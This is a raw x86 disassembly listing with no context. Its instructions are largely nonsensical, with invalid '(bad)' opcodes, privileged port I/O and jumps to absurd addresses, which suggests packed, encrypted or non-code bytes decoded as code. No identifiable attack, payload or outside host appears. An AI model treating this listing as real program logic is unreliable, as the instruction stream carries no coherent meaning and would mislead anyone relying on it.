  40e8d3:	shr    BYTE PTR [ebx+0x61aaec13],cl
  40e8d9:	cmp    al,0x4d
  40e8db:	or     ebx,DWORD PTR [ebp-0x25371455]
  40e8e1:	add    BYTE PTR [ebx+0x43eb7e32],ch
  40e8e7:	ja     0x40e923
  40e8e9:	std    
  40e8ea:	push   eax
  40e8eb:	xor    eax,0x23fa794e
  40e8f0:	fs sub eax,0x2265bb
	...
  40e93e:	add    BYTE PTR [eax+0x34],ch
  40e941:	fs mov esi,0xf6fafe7c
  40e947:	mov    bl,0x9d
  40e949:	aam    0xd4
  40e94b:	push   ebx
  40e94c:	mov    dh,0xeb
  40e94e:	and    esi,DWORD PTR [ecx-0x11]
  40e951:	add    BYTE PTR [eax],al
  40e953:	push   ds
  40e954:	pop    es
  40e955:	add    BYTE PTR [eax],al
  40e957:	push   cs
  40e958:	adc    DWORD PTR [eax],edi
  40e95a:	add    ebp,DWORD PTR [esi+edx*2-0xe]
  40e95e:	sbb    ah,BYTE PTR [ebx]
  40e960:	in     eax,dx
  40e961:	and    eax,0x39b1dea3
  40e966:	(bad)  
  40e967:	aas    
  40e968:	ret    
  40e969:	xchg   esi,eax
  40e96a:	push   esi
  40e96b:	call   0x2c288f7e
  40e970:	test   al,0xdb
  40e972:	retf   
  40e973:	xor    esp,DWORD PTR [ebp-0x6d]
  40e976:	out    dx,al
  40e977:	dec    eax
  40e978:	data16 hlt 
  40e97a:	push   ecx
  40e97b:	inc    esi
  40e97c:	fsubr  DWORD PTR [eax+ebp*2-0x122ccf98]
  40e983:	jbe    0x40e9e2
  40e985:	lea    eax,[ebp-0x6b925eef]
  40e98b:	in     eax,0xdd
  40e98d:	retf   0x9ad0
  40e990:	pushf  
  40e991:	call   0xb96904c0
  40e996:	jnp    0x40e9bb
  40e998:	inc    eax
  40e999:	add    ah,BYTE PTR [ebx]
  40e99b:	mov    ah,bl
  40e99d:	jno    0x40e98b
  40e99f:	retf   
  40e9a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9a1:	pusha  
  40e9a2:	dec    edi
  40e9a3:	push   ecx
  40e9a4:	fwait
  40e9a5:	lea    edx,[ebx]
  40e9a7:	je     0x40e94c
  40e9a9:	mov    BYTE PTR [ebp+0xa],al
  40e9ac:	outs   dx,BYTE PTR ds:[esi]
  40e9ad:	inc    ecx
  40e9ae:	enter  0x7026,0x62
  40e9b2:	outs   dx,DWORD PTR ds:[esi]
  40e9b3:	js     0x40e9e6
  40e9b5:	inc    eax
  40e9b6:	inc    ecx
  40e9b7:	pop    es
  40e9b8:	mov    BYTE PTR [edi-0x10],cl
  40e9bb:	fild   QWORD PTR [edi-0x5e]
  40e9be:	nop
  40e9bf:	inc    ebx
  40e9c0:	repnz int 0x5e
  40e9c3:	gs sahf 
  40e9c5:	xlat   BYTE PTR ds:[ebx]
  40e9c6:	and    bl,BYTE PTR [ebx]
  40e9c8:	adc    eax,0x900fc53f
  40e9cd:	mov    eax,0xce253b8e
  40e9d2:	mov    ebp,0x432302bf
  40e9d7:	mov    ds:0x92931b5a,al
  40e9dc:	adc    ebx,DWORD PTR [edi]
  40e9de:	dec    ecx
  40e9df:	ror    DWORD PTR [edx],0xe
  40e9e2:	jb     0x40e9b2
  40e9e4:	xor    cl,BYTE PTR [edx-0x32ad37b1]
  40e9ea:	sub    al,0x75
  40e9ec:	add    esp,DWORD PTR [ecx+0x6e5e0b28]
  40e9f2:	nop
  40e9f3:	inc    edi
  40e9f4:	les    edi,FWORD PTR [esi+0x2c]
  40e9f7:	sub    ah,BYTE PTR [esi+0x65]
  40e9fa:	add    ebx,esi
  40e9fc:	rcr    esp,cl
  40e9fe:	pop    edx
  40e9ff:	xchg   ebp,eax
  40ea00:	or     eax,0xad5722ee
  40ea05:	inc    edi
  40ea06:	rol    DWORD PTR [edx-0x2227d711],cl
  40ea0c:	test   eax,0x61559184
  40ea11:	sahf   
  40ea12:	cmp    eax,esi
  40ea14:	mov    edx,0x206d9bd3
  40ea19:	mov    al,ds:0x4bb47373
  40ea1e:	mov    edx,0x4766f42a
  40ea23:	out    0x81,al
  40ea25:	jp     0x40e9bd
  40ea27:	jmp    0xbf2245b0
  40ea2c:	je     0x40ea85
  40ea2e:	sub    al,0x6f
  40ea30:	inc    ebp
  40ea31:	pop    esp
  40ea32:	test   dh,0x1c
  40ea35:	sbb    DWORD PTR [edx-0x78253fdc],ebp
  40ea3b:	pop    ds
  40ea3c:	hlt    
  40ea3d:	addr16 repz xchg esi,eax
  40ea40:	jmp    0x40e9d2
  40ea42:	loopne 0x40e9d3
  40ea44:	mov    edi,0x85ea6dff
  40ea49:	adc    eax,edx
  40ea4b:	enter  0xda7c,0x8e
  40ea4f:	push   cs
  40ea50:	jnp    0x40ea8a
  40ea52:	or     bh,0xc2
  40ea55:	aas    
  40ea56:	xchg   edx,eax
  40ea57:	cmc    
  40ea58:	push   es
  40ea59:	adc    al,0x2
  40ea5b:	dec    esp
  40ea5c:	push   ss
  40ea5d:	(bad)
  40ea60:	daa    
  40ea61:	jmp    0x6498:0xabdd3c8f
  40ea68:	fwait
  40ea69:	cli    
  40ea6a:	push   0x79
  40ea6c:	sub    eax,DWORD PTR [edi]
  40ea6e:	and    eax,0x47dd6008
  40ea73:	adc    ebx,edi
  40ea75:	dec    ebx
  40ea76:	mov    dl,0x32
  40ea78:	daa    
  40ea79:	mov    edi,0xa66e39f
  40ea7e:	mov    eax,ds:0xc97344de
  40ea83:	aad    0xc5
  40ea85:	xor    BYTE PTR [ebx],bh
  40ea87:	sub    al,0x2c
  40ea89:	enter  0xc20e,0x3d
  40ea8d:	adc    eax,0x8f95ee86
  40ea92:	push   ecx
  40ea93:	fs enter 0x7704,0xbf
  40ea98:	daa    
  40ea99:	fiadd  DWORD PTR [esi+0x31]
  40ea9c:	inc    ebx
  40ea9d:	adc    cl,BYTE PTR [esi]
  40ea9f:	and    eax,0x95775280
  40eaa4:	sub    DWORD PTR [ebx],eax
  40eaa6:	ja     0x40eab7
  40eaa8:	pop    eax
  40eaa9:	xchg   DWORD PTR [edx],eax
  40eaab:	dec    edi
  40eaad:	je     0x40ea64
  40eaaf:	dec    edx
  40eab0:	mov    cl,0x28
  40eab2:	and    BYTE PTR ds:0xef32133f,al
  40eab8:	inc    esp
  40eab9:	xchg   ebp,eax
  40eaba:	add    edi,DWORD PTR [esi+ebp*2+0x5d670b71]
  40eac1:	jp     0x40eafa
  40eac3:	jg     0x40ea53
  40eac5:	jne    0x40eaa5
  40eac7:	js     0x40eb44
  40eac9:	jp     0x40eab4
  40eacb:	pop    es
  40eacc:	sbb    dh,BYTE PTR [eax+0x17]
  40eacf:	stc    
  40ead0:	lods   eax,DWORD PTR ds:[esi]
  40ead1:	nop
  40ead2:	scas   al,BYTE PTR es:[edi]
  40ead3:	outs   dx,BYTE PTR ds:[esi]
  40ead4:	and    ch,al
  40ead6:	mov    eax,ds:0xf079af84
  40eadb:	jnp    0x40ea6c
  40eadd:	cmp    eax,esi
  40eadf:	out    0x85,al
  40eae1:	jae    0x40eb3c
  40eae3:	aad    0x7e
  40eae5:	out    0x43,al
  40eae7:	popa   
  40eae8:	jno    0x40eaac
  40eaea:	popf   
  40eaeb:	mov    eax,0x7b4d3b55
  40eaf0:	into   
  40eaf1:	and    al,0xfd
  40eaf3:	stos   BYTE PTR es:[edi],al
  40eaf4:	cmovp  ebp,DWORD PTR [esi+0x799df7f0]
  40eafb:	je     0x40eabb
  40eafd:	ss cld 
  40eaff:	jno    0x40eb64
  40eb01:	rcr    DWORD PTR [edi-0x64252bf1],1
  40eb07:	jno    0x40eb64
  40eb09:	and    DWORD PTR [eax],edi
  40eb0b:	push   ebx
  40eb0c:	ins    BYTE PTR es:[edi],dx
  40eb0d:	shl    DWORD PTR [edi-0x6c748857],0x25
  40eb14:	and    dh,bl
  40eb16:	sbb    eax,0x8b236e53
  40eb1b:	and    eax,0xe8610458
  40eb20:	inc    edx
  40eb21:	mov    DWORD PTR [ebx+0x32eafc61],ecx
  40eb27:	jmp    0x5b8:0x58c3040e
  40eb2e:	addr16 and eax,0x3fddd936
  40eb34:	dec    BYTE PTR [edi+0x6f]
  40eb37:	ja     0x40eba6
  40eb39:	pop    ss
  40eb3a:	jmp    DWORD PTR [eax]
  40eb3c:	test   BYTE PTR [esi],dl
  40eb3e:	sbb    edx,eax
  40eb40:	stos   DWORD PTR es:[edi],eax
  40eb41:	xor    edx,DWORD PTR [ebx]
  40eb43:	push   ebp
  40eb44:	out    dx,eax
  40eb45:	and    eax,0xc06c549d
  40eb4a:	scas   al,BYTE PTR es:[edi]
  40eb4b:	lods   eax,DWORD PTR ds:[esi]
  40eb4c:	cmpxchg DWORD PTR [ecx+0x1dd310e7],esi
  40eb53:	and    eax,0x72620347
  40eb58:	xor    ebx,0x539ea4e8
  40eb5e:	mov    ebp,0xc6a74e60
  40eb63:	scas   eax,DWORD PTR es:[edi]
  40eb64:	rol    DWORD PTR [edx+edx*2-0x7e365ba],0x83
  40eb6c:	and    eax,ebp
  40eb6e:	outs   dx,BYTE PTR ds:[esi]
  40eb6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb70:	add    eax,0x19e1ee6e
  40eb75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb76:	push   ss
  40eb77:	outs   dx,DWORD PTR ds:[esi]
  40eb78:	xor    al,dl
  40eb7a:	xor    BYTE PTR [ebx],cl
  40eb7c:	mov    ebp,0xff7a027b
  40eb81:	pop    ss
  40eb82:	mov    cl,0xbf
  40eb84:	jne    0x40ebf5
  40eb86:	pop    ds
  40eb87:	int    0xf2
  40eb89:	xor    eax,esp
  40eb8b:	cdq    
  40eb8c:	adc    eax,0x3c1db65b
  40eb91:	stos   BYTE PTR es:[edi],al
  40eb92:	xor    DWORD PTR [eax],edx
  40eb94:	lods   eax,DWORD PTR ds:[esi]
  40eb95:	lods   eax,DWORD PTR ds:[esi]
  40eb96:	mov    eax,DWORD PTR [ebp+eiz*2+0x1c]
  40eb9a:	xchg   edx,eax
  40eb9b:	mov    ebp,0x9cf15cdf
  40eba0:	rcl    BYTE PTR [edi-0x4bf64768],cl
  40eba6:	push   ebp
  40eba7:	mov    BYTE PTR [ebp+ebp*1+0x7002510c],ah
  40ebae:	pushf  
  40ebaf:	in     al,dx
  40ebb0:	jne    0x40eb92
  40ebb2:	dec    edx
  40ebb3:	sub    al,BYTE PTR [ebx]
  40ebb5:	mov    esi,0x9d770b56
  40ebba:	and    bh,BYTE PTR [edx+edx*8-0x6f44d424]
  40ebc1:	mov    BYTE PTR [ecx-0x48714c1f],bl
  40ebc7:	sub    al,0xbf
  40ebc9:	iret   
  40ebca:	xchg   ecx,eax
  40ebcb:	mov    BYTE PTR [ebp-0x65],dh
  40ebce:	test   al,0x69
  40ebd0:	call   0x8b905f0e
  40ebd5:	add    bh,dl
  40ebd7:	ins    BYTE PTR es:[edi],dx
  40ebd8:	mov    edi,0xbc6470df
  40ebdd:	in     eax,dx
  40ebde:	rol    BYTE PTR [eax+0x2e],cl
  40ebe1:	aaa    
  40ebe2:	xor    DWORD PTR [ecx-0x35],ebp
  40ebe5:	imul   ecx,ebp,0xffffff9f
  40ebe8:	push   ecx
  40ebe9:	push   edi
  40ebea:	sar    BYTE PTR [eax+0x340eac27],0xfd
  40ebf1:	xor    dh,BYTE PTR [ecx]
  40ebf3:	test   esp,0xcac97345
  40ebf9:	pop    edi
  40ebfa:	int3   
  40ebfb:	jge    0x40eb99
  40ebfd:	pop    ecx
  40ebfe:	retf   
  40ebff:	imul   esi,ebp,0x6f746f17
  40ec05:	sti    
  40ec06:	push   ebp
  40ec07:	sub    ebp,DWORD PTR [ebx+eax*4+0x11]
  40ec0b:	cmp    BYTE PTR [edi+0x40],ch
  40ec0e:	sub    DWORD PTR [eax+ecx*8-0xd136251],0xfffffff3
  40ec16:	and    al,0xcf
  40ec18:	bound  edi,QWORD PTR [ebx-0x17057264]
  40ec1e:	test   eax,0xbcc1519f
  40ec23:	inc    ecx
  40ec24:	retf   0xe027
  40ec27:	push   ss
  40ec28:	mov    ss,WORD PTR [edx+eiz*2]
  40ec2b:	add    ecx,esi
  40ec2d:	push   esi
  40ec2e:	test   al,0x4f
  40ec30:	xchg   esp,eax
  40ec31:	adc    ah,ah
  40ec33:	(bad)  
  40ec34:	int    0xed
  40ec36:	mov    al,0xba
  40ec38:	call   0x64ff9180
  40ec3d:	mov    dh,0x8d
  40ec3f:	mov    esi,0xedee985f
  40ec44:	pop    ebx
  40ec45:	push   ss
  40ec46:	rcl    BYTE PTR [esi-0x62],cl
  40ec49:	xor    edx,esp
  40ec4b:	loop   0x40ec5a
  40ec4d:	xchg   esi,eax
  40ec4e:	jl     0x40ebe1
  40ec50:	jmp    0xc3cb202a
  40ec55:	aad    0x98
  40ec57:	pop    esp
  40ec58:	retf   0x1811
  40ec5b:	or     al,0x2d
  40ec5d:	push   es
  40ec5e:	or     al,0xa1
  40ec60:	and    edx,DWORD PTR [ecx+0x5b9955be]
  40ec66:	leave  
  40ec67:	mov    BYTE PTR [ecx+0x57dd8fc3],dh
  40ec6d:	xchg   DWORD PTR [ecx],eax
  40ec6f:	jge    0x40ec46
  40ec71:	jne    0x40ecea
  40ec73:	stos   DWORD PTR es:[edi],eax
  40ec74:	scas   eax,DWORD PTR es:[edi]
  40ec75:	fild   DWORD PTR [ebx+0x6acb3e5a]
  40ec7b:	or     BYTE PTR [esp+eiz*2+0xf94a293],dl
  40ec82:	pop    DWORD PTR ds:0x6231d5bc
  40ec88:	test   BYTE PTR [eax],ch
  40ec8a:	hlt    
  40ec8b:	out    0x5d,eax
  40ec8d:	pop    ss
  40ec8e:	fisttp DWORD PTR [esi-0x6b]
  40ec91:	call   0x74a8:0x84761f50
  40ec98:	in     eax,0x10
  40ec9a:	aad    0xa2
  40ec9c:	(bad)  
  40ec9d:	pop    esi
  40ec9e:	into   
  40ec9f:	xlat   BYTE PTR ds:[ebx]
  40eca0:	mov    edi,DWORD PTR [eax-0x19]
  40eca3:	dec    esp
  40eca4:	aas    
  40eca5:	retf   
  40eca6:	pop    ebx
  40eca7:	sub    esi,DWORD PTR [edx-0x63]
  40ecaa:	or     DWORD PTR [edx-0x1a],esp
  40ecad:	out    dx,eax
  40ecae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecaf:	imul   eax,DWORD PTR ds:[eax],0x10
  40ecb3:	mov    al,0x64
  40ecb5:	mov    esp,0xbf1f7702
  40ecba:	cmc    
  40ecbb:	or     ah,BYTE PTR [esi-0x32d368b3]
  40ecc1:	xchg   edx,eax
  40ecc2:	fsub   st(4),st
  40ecc4:	popf   
  40ecc5:	push   ebp
  40ecc6:	push   0x7dfdc44a
  40eccb:	(bad)  
  40eccc:	pop    ebx
  40eccd:	xor    ecx,DWORD PTR [edx+ecx*2-0x2c06a7fc]
  40ecd4:	cmp    eax,0x18f4c556
  40ecd9:	scas   eax,DWORD PTR es:[edi]
  40ecda:	jmp    0x40ec66
  40ecdc:	mov    esp,0x318d15a6
  40ece1:	push   eax
  40ece2:	push   es
  40ece3:	add    edx,DWORD PTR [edx+edi*8+0x4b8e9e66]
  40ecea:	sub    esi,edx
  40ecec:	sbb    edi,edi
  40ecee:	lods   eax,DWORD PTR ds:[esi]
  40ecef:	inc    esp
  40ecf0:	retf   0xadac
  40ecf3:	and    esp,DWORD PTR [edx-0x1d8a3120]
  40ecf9:	aam    0xb6
  40ecfb:	adc    ebp,DWORD PTR [ebp+0x764c97f7]
  40ed01:	fiadd  WORD PTR [ebx+0x4710904]
  40ed07:	aad    0x94
  40ed09:	dec    ebp
  40ed0a:	jg     0x40ecc5
  40ed0c:	mov    ecx,0xf1ff2a78
  40ed11:	(bad)  
  40ed12:	daa    
  40ed13:	lahf   
  40ed14:	mov    dh,0x58
  40ed16:	xchg   DWORD PTR [edx],ebx
  40ed18:	push   0xf4886d11
  40ed1d:	jns    0x40ed44
  40ed1f:	mov    ds:0x114e8757,eax
  40ed24:	mov    esi,DWORD PTR [ecx]
  40ed26:	pop    esp
  40ed27:	jmp    0x40ed02
  40ed29:	push   ds
  40ed2a:	std    
  40ed2b:	pop    ebp
  40ed2c:	rcr    DWORD PTR [ebx+edi*1],1
  40ed2f:	mov    ebx,0xc1189c4e
  40ed34:	ret    
  40ed35:	shr    BYTE PTR [edi-0xf],cl
  40ed38:	imul   edx,DWORD PTR ds:0x3ff0954b,0x13
  40ed3f:	(bad)  
  40ed40:	loopne 0x40eccc
  40ed42:	rol    DWORD PTR [eax+0x53],0xcf
  40ed46:	mov    ebx,0xd32bebd
  40ed4b:	mov    ch,0xf6
  40ed4d:	mov    cl,0xf6
  40ed4f:	jl     0x40ed3c
  40ed51:	sbb    ah,BYTE PTR cs:[eax-0x39]
  40ed55:	pop    edx
  40ed56:	ins    DWORD PTR es:[edi],dx
  40ed57:	push   ss
  40ed58:	push   ds
  40ed59:	mov    esi,0x23f8029a
  40ed5e:	callw  0x1a6a
  40ed62:	sub    dl,BYTE PTR [ebx]
  40ed64:	sti    
  40ed65:	cmp    DWORD PTR [ebp+edx*1-0x7e],esi
  40ed69:	and    eax,DWORD PTR es:[eax+0x58]
  40ed6d:	lock and BYTE PTR [ebp+0x6c4aa92c],0xaa
  40ed75:	cs mov al,0xfc
  40ed78:	shl    BYTE PTR [eax],1
  40ed7a:	das    
  40ed7b:	daa    
  40ed7c:	push   ss
  40ed7d:	mov    bh,0xc6
  40ed7f:	or     DWORD PTR cs:[ebx-0x66f04e1f],ebx
  40ed86:	mov    ch,0x6e
  40ed88:	ror    DWORD PTR [ecx-0x22562c70],0x35
  40ed8f:	in     al,dx
  40ed90:	push   ebp
  40ed91:	ret    
  40ed92:	std    
  40ed93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed94:	mov    dl,0x1c
  40ed96:	out    dx,eax
  40ed97:	sub    DWORD PTR [ebx-0x71],edi
  40ed9a:	jne    0x40edc4
  40ed9c:	ret    
  40ed9d:	scas   eax,DWORD PTR es:[edi]
  40ed9e:	mov    bh,0xdc
  40eda0:	fucom  st(2)
  40eda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eda3:	retf   
  40eda4:	cmc    
  40eda5:	cmp    DWORD PTR gs:[ebp-0x43],eax
  40eda9:	xchg   ecx,ecx
  40edab:	mov    ch,0xc9
  40edad:	mov    WORD PTR [esi+0x2a1bb151],?
  40edb3:	fsub   DWORD PTR [ebx]
  40edb5:	icebp  
  40edb6:	cld    
  40edb7:	(bad)  
  40edb8:	sub    eax,0x632e96a
  40edbd:	push   eax
  40edbe:	ins    DWORD PTR es:[edi],dx
  40edbf:	and    dl,BYTE PTR [edx+0x34c5475e]
  40edc5:	loope  0x40eda4
  40edc7:	fwait
  40edc8:	das    
  40edc9:	int3   
  40edca:	xor    eax,0x29b7baaf
  40edcf:	popf   
  40edd0:	cwde   
  40edd1:	mov    al,0x1c
  40edd3:	push   eax
  40edd4:	iret   
  40edd5:	xchg   ebx,eax
  40edd6:	mov    ds:0xf914e136,eax
  40eddb:	pop    edx
  40eddc:	mov    WORD PTR [edi],fs
  40edde:	sbb    BYTE PTR [edx+esi*2-0x20a50de0],0x1c
  40ede6:	rcl    DWORD PTR [ebp-0x52b8ed02],cl
  40edec:	sbb    DWORD PTR [edi-0x2ce1ee16],esp
  40edf2:	out    dx,al
  40edf3:	push   esi
  40edf4:	lods   al,BYTE PTR ds:[esi]
  40edf5:	adc    esp,DWORD PTR [eax]
  40edf7:	retf   
  40edf8:	cs xchg edi,eax
  40edfa:	jnp    0x40ee4b
  40edfc:	xlat   BYTE PTR ds:[ebx]
  40edfd:	pop    ebx
  40edfe:	sub    eax,esi
  40ee00:	push   cs
  40ee01:	data16 mov fs,WORD PTR [esi+0xca803c2]
  40ee08:	hlt    
  40ee09:	push   edx
  40ee0a:	xchg   BYTE PTR [ebx-0x4e],ah
  40ee0d:	and    al,0x1d
  40ee0f:	dec    edx
  40ee10:	stos   BYTE PTR es:[edi],al
  40ee11:	rol    DWORD PTR [ebp-0x4],1
  40ee14:	inc    ecx
  40ee15:	cmp    bh,BYTE PTR [edx-0x52d7c7a2]
  40ee1b:	inc    edi
  40ee1c:	jecxz  0x40ee75
  40ee1e:	lds    ecx,FWORD PTR [ebx+0x3d]
  40ee21:	inc    ebx
  40ee22:	sbb    al,0x65
  40ee24:	and    al,BYTE PTR ds:0x28e77738
  40ee2a:	push   edi
  40ee2b:	xchg   ebp,eax
  40ee2c:	adc    DWORD PTR [esi],esp
  40ee2e:	test   eax,0x1b519ac8
  40ee33:	jp     0x40ee32
  40ee35:	test   DWORD PTR [edx-0x70],ebx
  40ee38:	sub    eax,ebp
  40ee3a:	add    edx,esi
  40ee3c:	and    al,0x41
  40ee3e:	fdiv   st(3),st
  40ee40:	xor    eax,0xd6b23da0
  40ee45:	pop    edx
  40ee46:	clc    
  40ee47:	push   ebp
  40ee48:	dec    ebx
  40ee49:	in     eax,0xe3
  40ee4b:	xchg   DWORD PTR [esi+0x4ab73489],eax
  40ee51:	in     al,dx
  40ee52:	ds int 0x47
  40ee55:	sbb    al,0x80
  40ee57:	jno    0x40eebd
  40ee59:	adc    cl,dl
  40ee5b:	cs loopne 0x40ee56
  40ee5e:	and    BYTE PTR [edi+ebx*2-0x7d],dl
  40ee62:	xchg   ecx,eax
  40ee63:	xor    al,0x6a
  40ee65:	mov    ah,BYTE PTR [ecx+0x3b]
  40ee68:	jle    0x40eed6
  40ee6a:	and    dl,BYTE PTR [ebp+edx*1+0x28]
  40ee6e:	sar    DWORD PTR [esi-0x4af28da4],cl
  40ee74:	call   0x2346d8e
  40ee79:	add    ebx,DWORD PTR [edi+eiz*2]
  40ee7c:	scas   al,BYTE PTR es:[edi]
  40ee7d:	stos   BYTE PTR es:[edi],al
  40ee7e:	dec    ebx
  40ee7f:	mov    ah,dh
  40ee81:	push   ebx
  40ee82:	sti    
  40ee83:	das    
  40ee84:	fwait
  40ee85:	rcl    DWORD PTR [eax+eax*2],0xa4
  40ee89:	push   ds
  40ee8a:	out    0xf0,eax
  40ee8c:	stos   BYTE PTR es:[edi],al
  40ee8d:	(bad)  
  40ee8e:	jmp    DWORD PTR [ecx-0x47]
  40ee91:	jbe    0x40ee8b
  40ee93:	stc    
  40ee94:	pop    ss
  40ee95:	in     eax,0xea
  40ee97:	push   cs
  40ee98:	ja     0x40eee4
  40ee9a:	cmp    al,0x80
  40ee9c:	data16 ins BYTE PTR es:[edi],dx
  40ee9e:	lock bound eax,QWORD PTR [ebp+0x67]
  40eea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eea3:	inc    edi
  40eea4:	ins    BYTE PTR es:[edi],dx
  40eea5:	and    al,0xb2
  40eea7:	mov    ds:0x32f76eda,eax
  40eeac:	jno    0x40ef22
  40eeae:	clc    
  40eeaf:	cmp    eax,0xafe86685
  40eeb4:	mov    ds:0x9544005c,al
  40eeb9:	cmp    eax,0x194a7adf
  40eebe:	scas   al,BYTE PTR es:[edi]
  40eebf:	rcl    BYTE PTR [ecx],0x8d
  40eec2:	mov    ebp,0xe342445d
  40eec7:	jb     0x40eed6
  40eec9:	and    eax,0x2905850b
  40eece:	sbb    BYTE PTR [edx-0x3690d495],dh
  40eed4:	jns    0x40ef3f
  40eed6:	aad    0xb5
  40eed8:	jmp    0x40eea9
  40eeda:	sub    edx,DWORD PTR [ecx-0x117fa581]
  40eee0:	dec    edi
  40eee1:	jbe    0x40ee6d
  40eee3:	stos   DWORD PTR es:[edi],eax
  40eee4:	ret    0x33fa
  40eee7:	mov    ch,0xef
  40eee9:	jmp    DWORD PTR [eax]
  40eeeb:	adc    DWORD PTR [ebx],ebx
  40eeed:	mov    esi,0xd4386e6c
  40eef2:	bnd jno 0x40ef46
  40eef5:	fwait
  40eef6:	inc    ebp
  40eef7:	dec    eax
  40eef8:	clc    
  40eef9:	inc    ecx
  40eefa:	inc    eax
  40eefb:	icebp  
  40eefc:	add    ecx,DWORD PTR [edi+0x130771bf]
  40ef02:	mov    ebx,edx
  40ef04:	in     al,dx
  40ef05:	aam    0x9a
  40ef07:	out    0xec,al
  40ef09:	or     al,0x29
  40ef0b:	sahf   
  40ef0c:	cmp    bl,BYTE PTR [edx]
  40ef0e:	add    BYTE PTR [ebp-0x1d1a355a],bh
  40ef14:	sbb    BYTE PTR [edi*8+0x2afffab8],cl
  40ef1b:	stos   DWORD PTR es:[edi],eax
  40ef1c:	sahf   
  40ef1d:	cdq    
  40ef1e:	mov    DWORD PTR [edx+esi*8+0x6f69ec52],ebp
  40ef25:	ins    BYTE PTR es:[edi],dx
  40ef26:	addr16 (bad) 
  40ef28:	jne    0x40eec4
  40ef2a:	addr16 mov dl,0xee
  40ef2d:	shl    DWORD PTR [eax+0x66],0x64
  40ef31:	(bad)  
  40ef33:	dec    edx
  40ef34:	imul   ebx,DWORD PTR [ecx],0xa0ed83cb
  40ef3a:	fild   WORD PTR [eax-0x1cd41d7f]
  40ef40:	xchg   ecx,eax
  40ef41:	(bad)  
  40ef42:	out    0x58,al
  40ef44:	adc    BYTE PTR [edi-0xe],0x82
  40ef48:	mov    WORD PTR ds:0x6afe2b8a,fs
  40ef4e:	es dec edi
  40ef50:	xor    esp,DWORD PTR [edi]
  40ef52:	outs   dx,BYTE PTR ds:[esi]
  40ef53:	cmp    eax,DWORD PTR gs:[esi-0x50dd38d5]
  40ef5a:	dec    edx
  40ef5b:	add    ebp,DWORD PTR [ecx+0x1d]
  40ef5e:	fdiv   QWORD PTR [eax]
  40ef60:	lds    edi,FWORD PTR [esi]
  40ef62:	xor    esp,DWORD PTR [edx]
  40ef64:	sub    BYTE PTR [ebp+ebx*1+0x65],al
  40ef68:	jnp    0x40ef68
  40ef6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef6b:	xor    ah,dh
  40ef6d:	mov    esi,0x8c5b9e82
  40ef72:	(bad)  
  40ef73:	cwde   
  40ef74:	(bad)
  40ef77:	(bad)  
  40ef78:	fst    QWORD PTR [edx+ebx*2+0x4cf934e4]
  40ef7f:	fwait
  40ef80:	icebp  
  40ef81:	cmc    
  40ef82:	sub    ah,ch
  40ef84:	scas   al,BYTE PTR es:[edi]
  40ef85:	dec    ebp
  40ef86:	lock pop esp
  40ef88:	xor    ebp,eax
  40ef8a:	cmp    dh,BYTE PTR [esi]
  40ef8c:	mov    ebx,0x1c0b04bc
  40ef91:	jmp    0xfb7c4649
  40ef96:	jnp    0x40ef3c
  40ef98:	sbb    edx,DWORD PTR [ebp+0x6f]
  40ef9b:	jl     0x40ef2c
  40ef9d:	push   esi
  40ef9e:	test   al,0x8
  40efa0:	test   ecx,ebx
  40efa2:	jo     0x40ef75
  40efa4:	fmul   DWORD PTR [ecx+0x52]
  40efa7:	scas   al,BYTE PTR es:[edi]
  40efa8:	iret   
  40efa9:	in     al,0xa4
  40efab:	adc    al,0xb6
  40efad:	int    0xae
  40efaf:	xchg   ecx,eax
  40efb0:	mov    ebp,0x5590f461
  40efb5:	ss push ds
  40efb7:	push   0x5a722fab
  40efbc:	pop    ds
  40efbd:	jns    0x40efba
  40efbf:	je     0x40efee
  40efc1:	lea    eax,[ecx]
  40efc3:	xchg   esp,eax
  40efc4:	xchg   BYTE PTR [eax],bh
  40efc6:	fiadd  WORD PTR [ebx-0x60070ed8]
  40efcc:	(bad)  
  40efcd:	mov    esi,0x53e672e7
  40efd2:	stc    
  40efd3:	test   eax,0x1223636e
  40efd8:	call   0x43b0:0xcfd5008f
  40efdf:	mov    edi,0x7b037acf
  40efe4:	dec    ebx
  40efe5:	cmp    bh,BYTE PTR [eax+0x5]
  40efe8:	adc    cl,dl
  40efea:	pop    ds
  40efeb:	test   edi,esi
  40efed:	scas   eax,DWORD PTR es:[edi]
  40efee:	hlt    
  40efef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eff0:	mov    ebx,0x84dd4d87
  40eff5:	mov    ah,0xee
  40eff7:	fwait
  40eff8:	cmp    bh,BYTE PTR [eax]
  40effa:	push   edi
  40effb:	(bad)  
  40effc:	sbb    BYTE PTR [ecx+0x2b],cl
  40efff:	dec    ecx
  40f000:	jmp    0xb1f7:0xf7249c2e
  40f007:	or     al,0xe1
  40f009:	mov    ds:0xa639de35,al
  40f00e:	jnp    0x40efcd
  40f010:	or     ch,ch
  40f012:	dec    ecx
  40f013:	add    DWORD PTR [ebp+0x7f],ebx
  40f016:	popa   
  40f017:	bound  esi,QWORD PTR [edx+0x47]
  40f01a:	inc    esi
  40f01b:	out    0x53,al
  40f01d:	dec    ax
  40f01f:	jle    0x40f04a
  40f021:	inc    ebx
  40f022:	fisub  WORD PTR ds:0xf781de98
  40f028:	jecxz  0x40f09a
  40f02a:	call   0x24ef5db4
  40f02f:	xchg   edx,eax
  40f030:	jns    0x40f00e
  40f032:	loopne 0x40f05a
  40f034:	frstor ds:0x662bcbb6
  40f03a:	mov    WORD PTR [esi+0x49f90cf4],ds
  40f040:	loop   0x40f00b
  40f042:	dec    ecx
  40f043:	(bad)  
  40f044:	pop    ebp
  40f045:	push   es
  40f046:	fwait
  40f047:	sbb    eax,0xddbf5e4
  40f04c:	adc    bl,ah
  40f04e:	sbb    eax,0xb6d3a92a
  40f053:	xchg   esi,eax
  40f054:	pop    ebx
  40f055:	inc    ecx
  40f056:	mov    ?,WORD PTR [esi+0x170a6cf5]
  40f05c:	mov    ebp,0x7ce3d872
  40f061:	gs int 0xb2
  40f064:	push   ecx
  40f065:	adc    al,BYTE PTR [esi-0x3c]
  40f068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f069:	call   0xf6b6bc5
